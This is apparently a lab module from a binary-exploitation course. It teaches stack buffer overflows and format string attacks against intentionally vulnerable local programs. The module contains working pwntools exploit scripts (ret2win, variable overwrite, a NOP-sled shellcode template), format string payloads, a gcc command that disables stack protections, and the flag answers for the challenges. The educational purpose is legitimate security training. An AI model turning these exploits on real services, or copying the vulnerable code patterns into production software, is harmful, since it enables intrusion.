# Buffer Overflow Fundamentals

Learn the fundamentals of binary exploitation through hands-on practice with the CyberLab vulnerable servers.

## Overview

Buffer overflows occur when a program writes data beyond the boundaries of allocated memory. This can overwrite critical data structures like return addresses, allowing attackers to hijack program execution.

```
+-----------------------------------------------------------------------------+
|                        STACK MEMORY LAYOUT                                   |
+-----------------------------------------------------------------------------+
|                                                                              |
|   HIGH MEMORY                                                                |
|   +-------------------+                                                      |
|   | Command Line Args |                                                      |
|   +-------------------+                                                      |
|   | Environment Vars  |                                                      |
|   +-------------------+                                                      |
|   |                   |                                                      |
|   |       STACK       |  <-- Grows downward                                  |
|   |                   |                                                      |
|   +-------------------+                                                      |
|   |   Return Address  |  <-- TARGET: Overwrite this!                         |
|   +-------------------+                                                      |
|   |   Saved EBP/RBP   |  <-- Base pointer                                    |
|   +-------------------+                                                      |
|   |   Local Buffer    |  <-- Our input goes here                             |
|   +-------------------+                                                      |
|   |                   |                                                      |
|   |       HEAP        |  <-- Grows upward                                    |
|   |                   |                                                      |
|   +-------------------+                                                      |
|   |   BSS (Uninit)    |                                                      |
|   +-------------------+                                                      |
|   |   Data (Init)     |                                                      |
|   +-------------------+                                                      |
|   |   Text (Code)     |                                                      |
|   +-------------------+                                                      |
|   LOW MEMORY                                                                 |
|                                                                              |
+-----------------------------------------------------------------------------+
```

## Learning Objectives

By completing this section, you will be able to:

- Understand how the stack works and function calls
- Identify buffer overflow vulnerabilities
- Find the exact offset to overwrite the return address
- Redirect execution to arbitrary functions (ret2win)
- Use debugging tools like GDB and pwntools
- Understand basic shellcode concepts

## Labs

| Lab | Topic | Target | Difficulty | Duration |
|-----|-------|--------|------------|----------|
| 1 | Stack Smashing Basics | stack-vuln | Beginner | 30 min |
| 2 | Return Address Overwrite | vuln-server | Intermediate | 1 hr |
| 3 | Format String Vulnerabilities | format-vuln | Advanced | 1 hr |

---

## CyberLab Buffer Overflow Services

The lab environment includes three vulnerable C programs:

### 1. vuln-server (Port 9999)

Main buffer overflow target - ret2win style challenge.

```bash
# Connect to the server
nc localhost 9999

# Server provides:
# - Buffer size: 64 bytes
# - Address of secret_function
# - Goal: Call secret_function to get the flag
```

**Vulnerability:** Uses `strcpy()` without bounds checking.

### 2. stack-vuln

Variable overwrite challenge - simpler than ret2win.

```bash
# Run inside container
docker exec -it lab-buffer-overflow /app/stack-vuln

# Goal: Overflow password buffer to modify 'authenticated' variable
# Buffer size: 32 bytes
```

**Vulnerability:** Uses `gets()` which has no bounds checking.

### 3. format-vuln

Format string vulnerability challenge.

```bash
# Run inside container
docker exec -it lab-buffer-overflow /app/format-vuln

# Goal: Read/modify memory using format string attacks
# Try: %x, %p, %s, %n
```

**Vulnerability:** Uses `printf(user_input)` without format specifier.

---

## Understanding Buffer Overflows

### How Functions Work

When a function is called:
1. Arguments pushed to stack
2. Return address pushed to stack
3. Old base pointer (EBP/RBP) saved
4. Local variables allocated on stack

```c
void vulnerable_function(char *input) {
    char buffer[64];    // Local buffer on stack
    strcpy(buffer, input);  // No bounds checking!
}
```

### The Stack Frame

```
+------------------+ High Address
|   Arguments      |
+------------------+
|  Return Address  | <-- Overwrite target
+------------------+
|   Saved RBP      |
+------------------+
|   buffer[63]     |
|       ...        |
|   buffer[0]      | <-- Input starts here
+------------------+ Low Address
```

### The Overflow

If we send more than 64 bytes:
- First 64 bytes fill the buffer
- Next 8 bytes overwrite saved RBP
- Next 8 bytes overwrite the return address!

---

## Finding the Offset

### Method 1: Pattern Generation

Use a cyclic pattern to find the exact offset.

```bash
# Generate pattern with pwntools
python3 -c "from pwn import *; print(cyclic(100))"
# Output: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

# Send to program and note the crash address
# Use cyclic_find to get offset
python3 -c "from pwn import *; print(cyclic_find(0x61616174))"
# Output: 76
```

### Method 2: Binary Search

```bash
# Try increasing lengths
python3 -c "print('A'*60)" | nc localhost 9999  # No crash
python3 -c "print('A'*70)" | nc localhost 9999  # No crash
python3 -c "print('A'*80)" | nc localhost 9999  # Crash!

# Narrow down
python3 -c "print('A'*76)" | nc localhost 9999  # Crash at boundary
```

### Method 3: GDB Analysis

```bash
# Inside container
docker exec -it lab-buffer-overflow /bin/bash

# Debug with GDB
gdb /app/vuln-server

# Set breakpoint and examine
(gdb) disas vulnerable_function
(gdb) break *vulnerable_function+30
(gdb) run
(gdb) info frame
(gdb) x/20x $rsp
```

---

## Exploitation Techniques

### 1. ret2win (Return to Win Function)

Overwrite return address to jump to an existing "win" function.

```python
from pwn import *

# Connect to target
p = remote('localhost', 9999)

# Receive banner (contains secret_function address)
banner = p.recvuntil(b'Enter your input:')
print(banner.decode())

# Extract address (e.g., 0x401234)
# Parse from banner or hardcode if known
secret_addr = 0x401196  # Example - get from banner

# Build payload
offset = 72  # Buffer(64) + RBP(8)
payload = b'A' * offset
payload += p64(secret_addr)

# Send payload
p.sendline(payload)

# Receive flag
p.interactive()
```

### 2. Variable Overwrite

For stack-vuln, just overflow into the adjacent variable.

```python
from pwn import *

# Connect
p = process('/app/stack-vuln')

# Buffer is 32 bytes, authenticated is right after
# Overflow buffer and set authenticated to non-zero
payload = b'A' * 32 + b'\x01'  # 32 As + 1 non-zero byte

p.sendline(payload)
p.interactive()
```

### 3. NOP Sled + Shellcode (Advanced)

For systems without ASLR/NX (not in CyberLab by default):

```python
# Generate shellcode
shellcode = asm(shellcraft.sh())

# Build payload with NOP sled
nop_sled = b'\x90' * 100
payload = nop_sled + shellcode
payload += b'A' * (offset - len(payload))
payload += p64(buffer_address + 50)  # Jump into NOP sled
```

---

## Using GDB for Binary Analysis

### Basic Commands

```bash
# Start GDB
gdb ./program

# Run with arguments
(gdb) run arg1 arg2

# Set breakpoint
(gdb) break main
(gdb) break *0x401234

# Continue execution
(gdb) continue
(gdb) c

# Step through instructions
(gdb) stepi
(gdb) nexti

# Examine memory
(gdb) x/20x $rsp       # 20 hex words from stack pointer
(gdb) x/s 0x401234     # String at address
(gdb) x/i $rip         # Current instruction

# View registers
(gdb) info registers
(gdb) print $rsp
(gdb) print $rip
```

### GDB with pwndbg/gef

These GDB extensions make exploitation easier:

```bash
# Install pwndbg (recommended)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Useful commands
pwndbg> checksec           # Check binary protections
pwndbg> vmmap              # Memory map
pwndbg> stack 20           # View stack
pwndbg> cyclic 100         # Generate pattern
pwndbg> cyclic -l 0x61616174  # Find offset
```

---

## Using pwntools

### Installation

```bash
pip install pwntools
```

### Basic Usage

```python
from pwn import *

# Set context for architecture
context.arch = 'amd64'
context.log_level = 'debug'

# Connect to remote
p = remote('localhost', 9999)

# Or run locally
p = process('./vuln-server')

# Receive data
data = p.recv(1024)
data = p.recvline()
data = p.recvuntil(b'Enter:')

# Send data
p.send(b'hello')
p.sendline(b'hello')  # Adds newline

# Pack addresses
addr = p64(0x401234)   # 64-bit little-endian
addr = p32(0x401234)   # 32-bit little-endian

# Generate patterns
pattern = cyclic(100)
offset = cyclic_find(0x61616174)

# Shellcode
shellcode = asm(shellcraft.sh())

# Interactive mode
p.interactive()
```

---

## Format String Vulnerabilities

### Understanding Format Strings

```c
// Vulnerable
printf(user_input);

// Correct
printf("%s", user_input);
```

### Exploitation

```bash
# Leak stack values
echo '%x.%x.%x.%x.%x.%x' | ./format-vuln

# Leak with position
echo '%6$x' | ./format-vuln  # 6th value on stack

# Read string from address
echo 'AAAA.%7$s' | ./format-vuln

# Write with %n (writes number of characters printed)
# Dangerous - can crash program
```

---

## Practice with CyberLab

### Exercise 1: Stack Variable Overwrite

```bash
# Connect to container
docker exec -it lab-buffer-overflow /bin/bash

# Run stack-vuln
/app/stack-vuln

# Goal: Set authenticated to non-zero
# Hint: Buffer is 32 bytes
# Solution: Send 33+ characters
python3 -c "print('A'*33)" | /app/stack-vuln
```

### Exercise 2: vuln-server ret2win

```bash
# From host machine
nc localhost 9999

# Note the secret_function address
# Calculate offset (64 + 8 = 72)
# Craft payload

# Using pwntools
python3 << 'EOF'
from pwn import *

p = remote('localhost', 9999)
p.recvuntil(b'secret_function:')
addr = int(p.recvline().strip(), 16)
print(f"Target: {hex(addr)}")

payload = b'A' * 72 + p64(addr)
p.sendlineafter(b'input:', payload)
p.interactive()
EOF
```

### Exercise 3: Format String Exploitation

```bash
# Inside container
docker exec -it lab-buffer-overflow /bin/bash

# Run format-vuln
/app/format-vuln

# Try leaking memory
AAAA%08x.%08x.%08x.%08x

# Try reading from stack
%p.%p.%p.%p.%p.%p
```

---

## Flags

| Challenge | Flag |
|-----------|------|
| vuln-server | FLAG{buff3r_0v3rfl0w_m4st3r} |
| stack-vuln | FLAG{st4ck_sm4sh1ng_succ3ss} |
| format-vuln (read) | FLAG{f0rm4t_str1ng_m4st3r} |
| format-vuln (write) | FLAG{f0rm4t_wr1t3_pr1m1t1v3} |

---

## Binary Protections

Modern binaries have protections. Check with `checksec`:

```bash
checksec --file=./binary
```

| Protection | Description | Bypass |
|------------|-------------|--------|
| NX/DEP | Stack not executable | ROP, ret2libc |
| ASLR | Randomized addresses | Info leak, brute force |
| Stack Canary | Detects overflow | Leak canary, format string |
| PIE | Code at random address | Info leak |
| RELRO | Read-only GOT | Harder, but not impossible |

The CyberLab servers are compiled WITHOUT protections for learning:
```bash
gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
```

---

## Resources

- [LiveOverflow Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [pwntools Documentation](https://docs.pwntools.com/)
- [GDB Cheat Sheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
- [Exploit Education](https://exploit.education/)
- [ROP Emporium](https://ropemporium.com/)

---

**Previous:** [03 - Privilege Escalation](../03-privilege-escalation/) | **Next:** [05 - Password Attacks](../05-password-attacks/)
